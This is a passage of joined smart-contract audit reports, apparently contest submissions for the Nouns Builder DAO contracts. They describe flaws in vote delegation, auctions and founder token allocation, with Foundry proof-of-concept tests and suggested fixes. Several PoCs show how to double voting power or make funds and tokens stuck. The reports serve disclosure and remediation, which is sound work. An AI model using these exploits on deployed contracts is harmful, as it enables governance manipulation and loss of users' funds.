//Amount of tokens to bid up     uint256 tokensToBidder = 10;      address bidder1 = vm.addr(0xB1);     vm.deal(founder, 10000 ether);     vm.deal(bidder1, 10000 ether);      //Start the first auction     vm.prank(founder);     auction.unpause();      //Simulates an `auctionsToRun` amount of auctions in which the first `tokensForBidder` tokens     //are minted and then every auction ends with no bidders.     uint256 amountOfBurnedTokens;     for (uint256 i = 1; i < auctionsToRun + 1; ++i) {         if (i < tokensToBidder) {             uint256 id = token.totalSupply() - 1;             vm.prank(bidder1);             auction.createBid{ value: 0.15 ether }(id);         } else {             amountOfBurnedTokens++;         }          vm.warp(block.timestamp + auction.duration() + 1);         auction.settleCurrentAndCreateNewAuction();     }      uint256 founderVotes = token.getVotes(founder);     uint256 founder2Votes = token.getVotes(founder2);     uint256 bidder1Votes = token.getVotes(bidder1);     uint256 auctionVotes = token.getVotes(address(auction));      uint256 realVotingPower = founderVotes + founder2Votes + bidder1Votes;     uint256 assumedVotingPower = token.totalSupply();      assertEq(realVotingPower, assumedVotingPower - amountOfBurnedTokens - auctionVotes);      //Create mock proposal     (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) = mockProposal();     vm.prank(bidder1);     bytes32 proposalId = governor.propose(targets, values, calldatas, "");      emit log_string("Amount of tokens minted: ");     emit log_uint(token.totalSupply());      emit log_string("Amount of tokens burned:");     emit log_uint(amountOfBurnedTokens);      emit log_string("---------");      emit log_string("The real quorumThresholdBps is: ");     uint256 realquorumThresholdBps = (governor.getProposal(proposalId).quorumVotes * 10_000) / realVotingPower;     emit log_uint(realquorumThresholdBps);      emit log_string("The assumed quorumThresholdBps is:");     uint256 assumedquorumThresholdBps = (governor.getProposal(proposalId).quorumVotes * 10_000) / token.totalSupply();     emit log_uint(assumedquorumThresholdBps);      emit log_string("---------");      vm.warp(governor.getProposal(proposalId).voteStart);      //Everybody cast a `for` vote     vm.prank(founder);     governor.castVote(proposalId, 1);      vm.prank(founder2);     governor.castVote(proposalId, 1);      vm.prank(bidder1);     governor.castVote(proposalId, 1);      emit log_string("The amount of votes necessary for this proposal to pass is:");     emit log_uint(governor.getProposal(proposalId).quorumVotes);      emit log_string("The amount of for votes in the proposal:");     emit log_uint(governor.getProposal(proposalId).forVotes);      //Proposal still doesn't pass     vm.warp((governor.getProposal(proposalId).voteEnd));     vm.expectRevert(abi.encodeWithSignature("PROPOSAL_UNSUCCESSFUL()"));     governor.queue(proposalId); } ```  ## Tools Used Forge  ## Recommended Mitigation Steps Either one of this 2 options is viable: 1. Decrease `token.totalSupply()` whenever a token gets burned. This might not be expected behaviour from the point of view of external protocols. 2. Adjust the calculations in `proposal.quorum()` and `governor.proposalThreshold()` in such a way that they take into account the burned tokens and the tokens currently held by the auction contract.
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L131-L135 https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L176-L190 https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L192-L235   # Vulnerability details  The owner of one or many `ERC721Votes` tokens can double their voting power once (and only once) by delegating to their own address as their first delegation.  ### Scenario This exploit relies on the initial default value of the `delegation` mapping in `ERC721Votes`, which is why it will only work once per address.  First, the token owner must call `delegate` or `delegateBySig`, passing their own address as the delegate:  [`ERC721Votes#delegate`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L131-L135)  ```solidity     /// @notice Delegates votes to an account     /// @param _to The address delegating votes to     function delegate(address _to) external {         _delegate(msg.sender, _to);     } ```  This calls into the internal `_delegate` function, with `_from` and `_to` both set to the token owner's address:  [`ERC721Votes#_delegate`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L176-L190)  ```solidity     /// @dev Updates delegate addresses     /// @param _from The address delegating votes from     /// @param _to The address delegating votes to     function _delegate(address _from, address _to) internal {         // Get the previous delegate         address prevDelegate = delegation[_from];          // Store the new delegate         delegation[_from] = _to;          emit DelegateChanged(_from, prevDelegate, _to);          // Transfer voting weight from the previous delegate to the new delegate         _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));     } ```  Since this is the token owner's first delegation, the `delegation` mapping does not contain a value for the `_from` address, and `prevDelegate` on L#181 will be set to `address(0)`:  [`ERC721Votes.sol#L180-L181`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L180-L181)  ```solidity         // Get the previous delegate         address prevDelegate = delegation[_from]; ```  This function then calls into `_moveDelegateVotes` to transfer voting power. This time, `_from` is `prevDelegate`, equal to `address(0)`; `_to` is the token owner's address; and `_amount` is `balanceOf(_from)`, the token owner's current balance:  [`ERC721Votes#_moveDelegateVotes`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L192-L235)  ```solidity  /// @dev Transfers voting weight     /// @param _from The address delegating votes from     /// @param _to The address delegating votes to     /// @param _amount The number of votes delegating     function _moveDelegateVotes(         address _from,         address _to,         uint256 _amount     ) internal {         unchecked {             // If voting weight is being transferred:             if (_from != _to && _amount > 0) {                 // If this isn't a token mint:                 if (_from != address(0)) {                     // Get the sender's number of checkpoints                     uint256 nCheckpoints = numCheckpoints[_from]++;                      // Used to store the sender's previous voting weight                     uint256 prevTotalVotes;                      // If this isn't the sender's first checkpoint: Get their previous voting weight                     if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints - 1].votes;                      // Update their voting weight                     _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);                 }                  // If this isn't a token burn:                 if (_to != address(0)) {                     // Get the recipients's number of checkpoints                     uint256 nCheckpoints = numCheckpoints[_to]++;                      // Used to store the recipient's previous voting weight                     uint256 prevTotalVotes;                      // If this isn't the recipient's first checkpoint: Get their previous voting weight                     if (nCheckpoints != 0) prevTotalVotes = checkpoints[_to][nCheckpoints - 1].votes;                      // Update their voting weight                     _writeCheckpoint(_to, nCheckpoints, prevTotalVotes, prevTotalVotes + _amount);                 }             }         }     } ```  The `if` condition on L#203 is `true`, since `_from` is `address(0)`, `_to` is the owner address, and `_amount` is nonzero:  [`ERC721Votes.sol#L202-L203`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L202-L203)  ```solidity             // If voting weight is being transferred:             if (_from != _to && _amount > 0) { ```  Execution skips the `if` block on L#205-217, since `_from` is `address(0)`:  [`ERC721Votes.sol#L205-L217`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L204-L217)  ```solidity                 // If this isn't a token mint:                 if (_from != address(0)) {                     // Get the sender's number of checkpoints                     uint256 nCheckpoints = numCheckpoints[_from]++;                      // Used to store the sender's previous voting weight                     uint256 prevTotalVotes;                      // If this isn't the sender's first checkpoint: Get their previous voting weight                     if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints - 1].votes;                      // Update their voting weight                     _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);                 } ```  However, the `if` block on L#220-232 will execute and increase the voting power allocated to `_to`:  [`ERC721Votes.sol#L220-L232`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L219-L232)  ```solidity                 // If this isn't a token burn:                 if (_to != address(0)) {                     // Get the recipients's number of checkpoints                     uint256 nCheckpoints = numCheckpoints[_to]++;                      // Used to store the recipient's previous voting weight                     uint256 prevTotalVotes;                      // If this isn't the recipient's first checkpoint: Get their previous voting weight                     if (nCheckpoints != 0) prevTotalVotes = checkpoints[_to][nCheckpoints - 1].votes;                      // Update their voting weight                     _writeCheckpoint(_to, nCheckpoints, prevTotalVotes, prevTotalVotes + _amount);                 } ```  The token owner's voting power has now been increased by an amount equal to their total number of tokens, without an offsetting decrease.  This exploit only works once: if a token owner subsequently delegates to themselves after their initial self delegation, `prevDelegate` will be set to a non-default value in `_delegate`, and the delegation logic will work as intended.  ### Impact Malicious `ERC21Votes` owners can accrue more voting power than they deserve. Especially malicious owners may quietly acquire multiple tokens before doubling their voting power. In an early DAO with a small supply of tokens, the impact of this exploit could be significant.  ### Recommendation Make the `delegates` function `public` rather than `external`:  ```solidity     /// @notice The delegate for an account     /// @param _account The account address     function delegates(address _account) public view returns (address) {         address current = delegation[_account];         return current == address(0) ? _account : current;     } ```  Then, call this function rather than accessing the `delegation` mapping directly:  ```solidity     /// @dev Updates delegate addresses     /// @param _from The address delegating votes from     /// @param _to The address delegating votes to     function _delegate(address _from, address _to) internal {         // Get the previous delegate         address prevDelegate = delegates(_from);          // Store the new delegate         delegation[_from] = _to;          emit DelegateChanged(_from, prevDelegate, _to);          // Transfer voting weight from the previous delegate to the new delegate         _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));     } ```  Note that the original NounsDAO contracts follow this pattern. (See [here](https://github.com/nounsDAO/nouns-monorepo/blob/master/packages/nouns-contracts/contracts/base/ERC721Checkpointable.sol#L83-L91) and [here](https://github.com/nounsDAO/nouns-monorepo/blob/master/packages/nouns-contracts/contracts/base/ERC721Checkpointable.sol#L83-L91)).   ### Test cases (Put the following test cases in `Gov.t.sol`)  ```solidity     function test_delegate_to_self_doubles_voting_power() public {         mintVoter1();          assertEq(token.getVotes(address(voter1)), 1);          vm.startPrank(voter1);         token.delegate(address(voter1));          assertEq(token.getVotes(address(voter1)), 2);     }      function mintToken(uint256 tokenId) internal {         vm.prank(voter1);         auction.createBid{ value: 0.420 ether }(tokenId);          vm.warp(block.timestamp + auctionParams.duration + 1 seconds);         auction.settleCurrentAndCreateNewAuction();     }      function test_delegate_to_self_multiple_tokens_doubles_voting_power() public {         // An especially malicious user may acquire multiple tokens         // before doubling their voting power through this exploit.         mintVoter1();         mintToken(3);         mintToken(4);         mintToken(5);         mintToken(6);          assertEq(token.getVotes(address(voter1)), 5);          vm.prank(voter1);         token.delegate(address(voter1));          assertEq(token.getVotes(address(voter1)), 10);     } ```
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L248-L254   # Vulnerability details  ## Impact If the first auction is paused and unpaused in a protocol deployed with no founder fees, the highest bid (as well as the first NFT), will get stuck in the protocol with no ability to retrieve either of them.  ## Proof of Concept In a protocol with founder ownership percentage set to 0, the first tokenId put to auction is #0.  If the first auction in such a protocol is paused and unpaused, the check for `if (auction.tokenId == 0)` will pass and `_createAuction()` will automatically be called, minting the next token and starting a new auction based on token #1.  The result is that `highestBid` and `highestBidder` are reset, the first auction is never settled, and the highest bid (as well as NFT #0) will remain stuck in the platform.  The following test confirms this finding:  ```solidity function test_PauseAndUnpauseInFirstAuction() public {     address bidder1 = vm.addr(0xB1);     address bidder2 = vm.addr(0xB2);      vm.deal(bidder1, 100 ether);     vm.deal(bidder2, 100 ether);      console.log("Deploying with no founder pct...");     deployMockWithEmptyFounders();      console.log("Unpausing...");     vm.prank(founder);     auction.unpause();      console.log("Bidder makes initial bid.");     vm.prank(bidder1);     auction.createBid{ value: 1 ether }(0);     (uint256 tokenId_, uint256 highestBid_, address highestBidder_,,,) = auction.auction();     console.log("Currently bidding for ID ", tokenId_);     console.log("Highest Bid: ", highestBid_, ". Bidder: ", highestBidder_);     console.log("Contract Balance: ", address(auction).balance);     console.log("--------");      console.log("Pausing and unpausing auction house...");     vm.startPrank(address(treasury));     auction.pause();     auction.unpause();     vm.stopPrank();      console.log("Bidder makes new bid.");     vm.prank(bidder2);     auction.createBid{ value: 0.5 ether }(1);     (uint256 tokenId2_, uint256 highestBid2_, address highestBidder2_,,,) = auction.auction();     console.log("Currently bidding for ID ", tokenId2_);     console.log("Highest Bid: ", highestBid2_, ". Bidder: ", highestBidder2_);     console.log("Contract Balance: ", address(auction).balance); ```  ## Tools Used  Manual Review, Foundry  ## Recommended Mitigation Steps  Remove the block in `unpause()` that transfers ownership and creates an auction if `auction.tokenId == 0` and trigger those actions manually in the deployment flow.
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L268   # Vulnerability details  If Alice the NFT owner first delegates her votes to herself, second delegates to anyone else with delegate() or delegateBySig() then all her NFT ids will become stuck: their transfers and burning will be disabled.  The issue is _afterTokenTransfer() callback running the _moveDelegateVotes() with an owner instead of her delegate. As Alice's votes in the checkpoint is zero after she delegated them, the subtraction _moveDelegateVotes() tries to perform during the move of the votes will be reverted.  As ERC721Votes is parent to Token and delegate is a kind of common and frequent operation, the impact is governance token moves being frozen in a variety of use cases, which interferes with governance voting process and can be critical for the project.  ## Proof of Concept  Suppose Alice delegated all her votes to herself and then decided to delegate them to someone else with either delegate() or delegateBySig() calling _delegate():  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190  ```solidity     function _delegate(address _from, address _to) internal {         // Get the previous delegate         address prevDelegate = delegation[_from];          // Store the new delegate         delegation[_from] = _to;          emit DelegateChanged(_from, prevDelegate, _to);          // Transfer voting weight from the previous delegate to the new delegate         _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));     } ```  _moveDelegateVotes() will set her votes to `0` as `_from == Alice` and `prevTotalVotes = _amount = balanceOf(Alice)` (as _afterTokenTransfer() incremented Alice's vote balance on each mint to her):  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L196-L217  ```solidity     function _moveDelegateVotes(         address _from,         address _to,         uint256 _amount     ) internal {         unchecked {             // If voting weight is being transferred:             if (_from != _to && _amount > 0) {                 // If this isn't a token mint:                 if (_from != address(0)) {                     // Get the sender's number of checkpoints                     uint256 nCheckpoints = numCheckpoints[_from]++;                      // Used to store the sender's previous voting weight                     uint256 prevTotalVotes;                      // If this isn't the sender's first checkpoint: Get their previous voting weight                     if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints - 1].votes;                      // Update their voting weight                     _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);                 } ```  After that her votes in the checkpoint become zero. She will not be able to transfer the NFT as `_afterTokenTransfer` will revert on `_moveDelegateVotes`'s attempt to move `1` vote from `Alice` to `_to`, while `checkpoints[Alice][nCheckpoints - 1].votes` is `0`:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L268  ```solidity     function _afterTokenTransfer(         address _from,         address _to,         uint256 _tokenId     ) internal override {         // Transfer 1 vote from the sender to the recipient         _moveDelegateVotes(_from, _to, 1); ```  ## Recommended Mitigation Steps  The root issue is _afterTokenTransfer() dealing with Alice instead of Alice's delegate.  Consider including delegates() call as a fix:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L268  ```solidity     function _afterTokenTransfer(         address _from,         address _to,         uint256 _tokenId     ) internal override {         // Transfer 1 vote from the sender to the recipient -       _moveDelegateVotes(_from, _to, 1); +       _moveDelegateVotes(delegates(_from), delegates(_to), 1); ```  As `delegates(address(0)) == address(0)` the burning/minting flow will persist:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L124-L129  ```solidity     /// @notice The delegate for an account     /// @param _account The account address     function delegates(address _account) external view returns (address) {         address current = delegation[_account];         return current == address(0) ? _account : current;     } ```   
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol#L147-L150 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol#L146 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol#L323-L327   # Vulnerability details  ## Impact There is an [unchecked block](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol#L147-L150) that in case timeBuffer is sufficiently large, would make the sum overflow and set the endTime of the auction in the past, making the auction end automatically. The developers are aware of this, that's why they have [this comment](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol#L146). But I think it's not a matter of realistically overflowing, it could be set to a value large enough by mistake. It's not worth it to not validate the value of the time buffer, because the consequences could be devastating.  The best option would be to validate in function [setTimeBuffer](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol#L323-L327) that the timeBuffer cannot be set to a large value.  ## Tools Used Manual analysis  ## Recommended Mitigation Steps Change function setTimeBuffer with this:  ```     function setTimeBuffer(uint256 _timeBuffer) external onlyOwner {         require(_timeBuffer < 31536000, "TimeBuffer: too big");          settings.timeBuffer = SafeCast.toUint40(_timeBuffer);          emit TimeBufferUpdated(_timeBuffer);     } ``` I supposed that **timeBuffer** should be less than one year (probably much less), so I compared here with the number of seconds in a year.
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L123   # Vulnerability details  ## Impact  A bidder can outbid previous bid with the same value, if the `(previous bid * minBidIncrement < 100)`.  ## Proof of Concept  ```solidity // Auction.sol  // createBid 117             unchecked { 118                 // Compute the minimum bid 119                 minBid = highestBid + ((highestBid * settings.minBidIncrement) / 100); 120             } 121 122             // Ensure the incoming bid meets the minimum 123             if (msg.value < minBid) revert MINIMUM_BID_NOT_MET();  331     function setMinimumBidIncrement(uint256 _percentage) external onlyOwner { 332         settings.minBidIncrement = SafeCast.toUint8(_percentage); 333 334         emit MinBidIncrementPercentageUpdated(_percentage); 335     } ```  When the `minBid` (defined in the line 119) is the same as the current `highestBid`, one can call `createBid` with the same value as the current `highestBid` (line 123). It means that the new bidder will get the Bid, even though the previous bidder has the same bid and was earlier. The `minBid` can be the same as the `highesBid` when `highestBid * minBidIncrement` is less than 100. So either the `highestBid` or `minBinIncrement` is too small, a bidder can overbid the precious one with the same amount of value.  The first bid should be higher or equal to the `reservePrice`. However, there is no safe guard against setting small `reservePrice` and `minBidIncrement`.  For example, let's say the `settings.minBidIncrement` is set to zero. Alice called `createBid` with 1 ether and is the current highestBidder with the `highestBid` of 1 ether. Bob calls `createBid` with 1 ether. The `minBid` in the line 119 will be 1ether as `minBidIncrement` is set to zero. In the line 123 the `msg.value` is 1 ether is the same as `minBid` therefore it will not revert. And now Bob is the `highestBidder` even though he bid the same value after Alice.  ## Tools Used  None  ## Recommended Mitigation Steps  Revert if the `msg.value` is the same as the `minBid`: ```solidity // Auction.sol  // createBid 117             unchecked { 118                 // Compute the minimum bid 119                 minBid = highestBid + ((highestBid * settings.minBidIncrement) / 100); 120             } 121 122             // Ensure the incoming bid meets the minimum -   if (msg.value < minBid) revert MINIMUM_BID_NOT_MET(); +  if (msg.value <= minBid) revert MINIMUM_BID_NOT_MET(); ```  <!-- zzzitron M00 -->  
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L179   # Vulnerability details  ## Impact  The Token as well as Auction cannot be used if the sum of `ownershipPct` is 100  ## Proof of Concept  ```solidity     function test_poc_mintforever() public {         createUsers(2, 1 ether);          address[] memory wallets = new address[](2);         uint256[] memory percents = new uint256[](2);         uint256[] memory vestExpirys = new uint256[](2);          uint256 pct = 50;         uint256 end = 4 weeks;          unchecked {             for (uint256 i; i < 2; ++i) {                 wallets[i] = otherUsers[i];                 percents[i] = pct;                 vestExpirys[i] = end;             }         }          deployWithCustomFounders(wallets, percents, vestExpirys);          assertEq(token.totalFounders(), 2);         assertEq(token.totalFounderOwnership(), 100);          Founder memory founder;          unchecked {             for (uint256 i; i < 100; ++i) {                 founder = token.getScheduledRecipient(i);                  if (i % 2 == 0) assertEq(founder.wallet, otherUsers[0]);                 else assertEq(founder.wallet, otherUsers[1]);             }         }  // // commented out as it will not stop //         vm.prank(otherUsers[0]); //         auction.unpause();      } ```  In the proof of concept, there are two founders and they both share 50% of ownership. If the `Auction` should be `unpause`d, and therefore triggers to mint tokens, it will go into the infinite loop and eventually revert for out of gas.  ```solidity // Token.sol  143     function mint() external nonReentrant returns (uint256 tokenId) { 144         // Cache the auction address 145         address minter = settings.auction; 146 147         // Ensure the caller is the auction 148         if (msg.sender != minter) revert ONLY_AUCTION(); 149 150         // Cannot realistically overflow 151         unchecked { 152             do { 153                 // Get the next token to mint 154                 tokenId = settings.totalSupply++; 155 156                 // Lookup whether the token is for a founder, and mint accordingly if so 157             } while (_isForFounder(tokenId)); 158         } 159 160         // Mint the next available token to the auction house for bidding 161         _mint(minter, tokenId); 162     }  177     function _isForFounder(uint256 _tokenId) private returns (bool) { 178         // Get the base token id 179         uint256 baseTokenId = _tokenId % 100; 180 181         // If there is no scheduled recipient: 182         if (tokenRecipient[baseTokenId].wallet == address(0)) { 183             return false; 184 185             // Else if the founder is still vesting: 186         } else if (block.timestamp < tokenRecipient[baseTokenId].vestExpiry) { 187             // Mint the token to the founder 188             _mint(tokenRecipient[baseTokenId].wallet, _tokenId); 189 190             return true; 191 192             // Else the founder has finished vesting: 193         } else { 194             // Remove them from future lookups 195             delete tokenRecipient[baseTokenId]; 196 197             return false; 198         } 199     } ```  In the `Token::mint`, there is a while loop which will keep looping as long as `_isForFounder` returns true. The `_isForFounder` function will return true is the given `_tokenId`'s recipient is still vesting. However, to check the recipient it is checking the `baseTokenId` which is `_tokenId % 100` (in line 179 above snippet). Which means, if the `tokenRecipient` of 0 to 99 are currently vesting, it will keep returning true and the while loop in the `mint` function will not stop. The `tokenRecipient` was set in the `_addFounders` and if the sum of all founders' ownership percent is 100, the `tokenRecipient` will be filled up to 100.   ## Tools Used  None  ## Recommended Mitigation Steps  use `_tokenId` instead of `baseTokenId`.  <!-- zzzitron H01 -->  
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L71-L126 https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L88   # Vulnerability details  ## Impact The initialize function of the `Token` contract receives an array of `FounderParams`, which contains the ownership percent of each founder as a `uint256`. The initialize function checks that the sum of the percents is not more than 100, but the value that is added to the sum of the percent is truncated to fit in `uint8`. This leads to an error because the value that is used for assigning the base tokens is the original, not truncated, `uint256` value.  This can lead to wrong assignment of the base tokens, and can also lead to a situation where not all the users will get the correct share of base tokens (if any).  ## Proof of Concept To verify this bug I created a foundry test. You can add it to the test folder and run it with `forge test --match-test testFounderGettingAllBaseTokensBug`.  This test deploys a token implementation and an `ERC1967` proxy that points to it, and initializes the proxy using an array of 2 founders, each having 256 ownership percent. The value which is added to the `totalOwnership` variable is a `uint8`, and when truncating 256 to fit in a `uint8` it will turn to 0, so this check will pass.  After the call to initialize, the test asserts that all the base token ids belongs to the first founder, which means the second founder didn't get any base tokens at all.  What actually happens here is that the first founder gets the first 256 token ids, and the second founder gets the next 256 token ids, but because the base token is calculated % 100, only the first 100 matters and they will be owned by the first owner.  This happens because `schedule`, which is equal to `100 / founderPct`, will be zero (`100 / 256 == 0` due to uint div operation), and the base token id won't be updated in `(baseTokenId += schedule) % 100` (this line contains another mistake, which will be reported in another finding). The place where it will be updated is in the `_getNextTokenId`, where it will be incremented by 1.  This exploit can work as long as the sum of the percents modulo 256 (truncation to `uint8`) is not more than 100.  ```sol // The relative path of this file is "test/FounderGettingAllBaseTokensBug.t.sol"  // SPDX-License-Identifier: MIT pragma solidity 0.8.15;  import { Test } from "forge-std/Test.sol";  import { IManager } from "../src/manager/Manager.sol"; import { IToken, Token } from "../src/token/Token.sol";  import { TokenTypesV1 } from "../src/token/types/TokenTypesV1.sol";  import { ERC1967Proxy } from "../src/lib/proxy/ERC1967Proxy.sol";  contract FounderGettingAllBaseTokensBug is Test, TokenTypesV1 {      Token imp;     address proxy;          function setUp() public virtual {         // Deploying the implementation and the proxy         imp = new Token(address(this));         proxy = address(new ERC1967Proxy(address(imp), ""));     }      function testFounderGettingAllBaseTokensBug() public {          IToken token = IToken(proxy);          address chadFounder = address(0xdeadbeef);         address betaFounder = address(0xBBBBBBBB); // beta          // Creating 2 founders with `ownershipPct = 256`         IManager.FounderParams[] memory founders = new IManager.FounderParams[](2);         founders[0] = IManager.FounderParams({             wallet: chadFounder,             ownershipPct: 256,             vestExpiry: 1 weeks         });         founders[1] = IManager.FounderParams({             wallet: betaFounder,             ownershipPct: 256,             vestExpiry: 1 weeks         });          // Initializing the proxy with the founders data         token.initialize(                founders,              // we don't care about these             abi.encode("", "", "", "", ""),             address(0),             address(0)         );          // Asserting that the chad founder got all the base token ids         // (`tokenId % 100` is calculated to get the base token, so it is enough to check only the first 100 token ids)         for (uint i; i < 100; ++i) {             assertEq(token.getScheduledRecipient(i).wallet == chadFounder, true);         }          // Run with `forge test --match-test testFounderGettingAllBaseTokensBug`         // Results:         //      [PASS] testFounderGettingAllBaseTokensBug() (gas: 13537465)         // Great success     } ```  ## Tools Used Manual audit & foundry for the PoC  ## Recommended Mitigation Steps Don't truncate the `founderPct` variable to a uint8 when adding it to the totalOwnership variable, or alternatively check that it is less than `type(uint8).max` (or less or equal to 100). After applying this fix and running the test again, the result is: ``` [FAIL. Reason: INVALID_FOUNDER_OWNERSHIP()] testFounderGettingAllBaseTokensBug() (gas: 58674) ```
- [Low](#low)     - [**1. Outdated compiler**](#1-outdated-compiler)     - [**2. Method marked as payable unnecessarily**](#2-method-marked-as-payable-unnecessarily)     - [**3. Integer overflow by unsafe casting**](#3-integer-overflow-by-unsafe-casting)     - [**4. Lack of checks**](#4-lack-of-checks)     - [**5. Not fully decentralized**](#5-not-fully-decentralized)     - [**6. Unsecure state order**](#6-unsecure-state-order)     - [**7. Timestamp dependence**](#7-timestamp-dependence) - [Non critical](#non-critical)     - [**8. Use abstract for base contracts**](#8-use-abstract-for-base-contracts)     - [**9. Avoid duplicate logic**](#9-avoid-duplicate-logic)     - [**10. Avoid hardcoded values**](#10-avoid-hardcoded-values)     - [**11. Unpredictable change of owner**](#11-unpredictable-change-of-owner)     - [**12. Improve user experience**](#12-improve-user-experience)  # Low  ## **1. Outdated compiler**  The pragma version used are:  ``` pragma solidity ^0.8.15; pragma solidity 0.8.15; pragma solidity ^0.8.4; pragma solidity ^0.8.0; ```  *Note that mixing pragma are not recommended. Because different compiler versions have different meanings and behaviors, it also significantly raises maintenance costs. As a result, depending on the compiler version selected for any given file, deployed contracts may have security issues.*  The minimum required version must be [0.8.16](https://github.com/ethereum/solidity/releases/tag/v0.8.16); otherwise, contracts will be affected by the following **important bug fixes**:  [0.8.3](https://blog.soliditylang.org/2021/03/23/solidity-0.8.3-release-announcement/):  - Optimizer: Fix bug on incorrect caching of Keccak-256 hashes.  [0.8.4](https://blog.soliditylang.org/2021/04/21/solidity-0.8.4-release-announcement/):  - ABI Decoder V2: For two-dimensional arrays and specially crafted data in memory, the result of abi.decode can depend on data elsewhere in memory. Calldata decoding is not affected.  [0.8.9](https://blog.soliditylang.org/2021/09/29/solidity-0.8.9-release-announcement/):  - Immutables: Properly perform sign extension on signed immutables. - User Defined Value Type: Fix storage layout of user defined value types for underlying types shorter than 32 bytes.  [0.8.13](https://blog.soliditylang.org/2022/03/16/solidity-0.8.13-release-announcement/): - Code Generator: Correctly encode literals used in `abi.encodeCall` in place of fixed bytes arguments.  [0.8.14](https://blog.soliditylang.org/2022/05/18/solidity-0.8.14-release-announcement/):  - ABI Encoder: When ABI-encoding values from calldata that contain nested arrays, correctly validate the nested array length against `calldatasize()` in all cases. - Override Checker: Allow changing data location for parameters only when overriding external functions.  [0.8.15](https://blog.soliditylang.org/2022/06/15/solidity-0.8.15-release-announcement/)  - Code Generation: Avoid writing dirty bytes to storage when copying `bytes` arrays. - Yul Optimizer: Keep all memory side-effects of inline assembly blocks.  [0.8.16](https://blog.soliditylang.org/2022/08/08/solidity-0.8.16-release-announcement/)  - Code Generation: Fix data corruption that affected ABI-encoding of calldata values represented by tuples: structs at any nesting level; argument lists of external functions, events and errors; return value lists of external functions. The 32 leading bytes of the first dynamically-encoded value in the tuple would get zeroed when the last component contained a statically-encoded array.  Apart from these, there are several minor bug fixes and improvements.  ## **2. Method marked as `payable` unnecessarily**  The following methods have been marked as `payable`, this may cause both administrators and users calling them to accidentally deposit ether with no recovery possible.  This may be done to save gas, but may result in more loss than benefit in case of one human error.  **Affected source code:**  - [Manager.sol:61](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/manager/Manager.sol#L61) - [ERC1967Proxy.sol:21](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/proxy/ERC1967Proxy.sol#L21) - 